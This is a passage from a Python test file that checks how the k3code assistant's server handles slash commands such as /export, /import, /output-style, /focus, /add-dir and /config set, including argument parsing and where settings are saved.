    assert CliRunner().invoke(cli, ["stats", "--days", "3"]).exit_code == 0


async def test_export_and_import_flags(env: Path, monkeypatch) -> None:
    server, _ = make_server(env / "work", monkeypatch)
    sid = await new_session(server, env)
    out = (await cmd(server, "/export --session", sid))["output"]
    assert "needs a value" in out and not (env / "--session").exists()
    out = (await cmd(server, "/export --settings-only --session-only", sid))["output"]
    assert "exclude each other" in out
    bundle = env / "b.k3bundle"
    await cmd(server, f"/export {bundle} --settings-only", sid)
    assert bundle.is_file()
    # `-y --yes <path>` used to take `-y` for the path
    out = (await cmd(server, f"/import -y --yes {bundle} --session-only", sid))["output"]
    assert out.startswith("Imported"), out
    assert "Usage" in (await cmd(server, f"/import {bundle} --settings-only --session-only", sid))["output"]
    await server.close()


async def test_focus_is_saved_and_output_style_says_where(env: Path, monkeypatch) -> None:
    from k3code import confio
    from k3code.paths import user_config_path

    server, _ = make_server(env / "work", monkeypatch)
    out = (await cmd(server, "/output-style concise"))["output"]  # no session at all
    assert "the default" in out and "this session" not in out
    assert confio.read_yaml(user_config_path())["output_style"] == "concise"
    sid = await new_session(server, env)
    await cmd(server, "/focus on", sid)
    assert confio.read_yaml(user_config_path())["display"]["focus_mode"] is True
    await rpc_(server, "config.set", {"key": "focus", "value": "off"})
    assert confio.read_yaml(user_config_path())["display"]["focus_mode"] is False
    out = (await cmd(server, "/output-style explanatory", sid))["output"]
    assert "for this session (" in out
    await server.close()


async def test_add_dir_strips_quotes_and_unknown_arguments_get_usage(env: Path, monkeypatch) -> None:
    server, _ = make_server(env / "work", monkeypatch)
    sid = await new_session(server, env)
    (env / "my dir").mkdir()
    out = (await cmd(server, '/add-dir "my dir"', sid))["output"]
    assert out.startswith("Added") and str(env / "my dir") in out and '"' not in out.split("Added", 1)[1]
    for line, word in (
        ("/daemon bogus", "Unknown argument"),
        ("/proposals bogus", "Unknown argument"),
        ("/learn bogus", "Usage"),
        ("/learn", "Usage"),
    ):
        assert word in (await cmd(server, line, sid))["output"], line
    await server.close()


async def test_config_set_project_says_where_it_applies(env: Path, monkeypatch) -> None:
    server, _ = make_server(env / "work", monkeypatch)
    other = env / "other"
    other.mkdir()
    sid = await new_session(server, other)
    out = (await cmd(server, "/config set --project output_style concise", sid))["output"]
    assert out.startswith("Set output_style") and "gateway's project" in out
    assert server.config.output_style == "default"  # another project's overlay stays out of the shared config
    here = await new_session(server, env / "srv")  # K3CODE_PROJECT_DIR: the gateway's own project
    out = (await cmd(server, "/config set --project output_style explanatory", here))["output"]
    assert out.startswith("Set output_style") and "gateway's project" not in out
    assert server.config.output_style == "explanatory"
    await server.close()
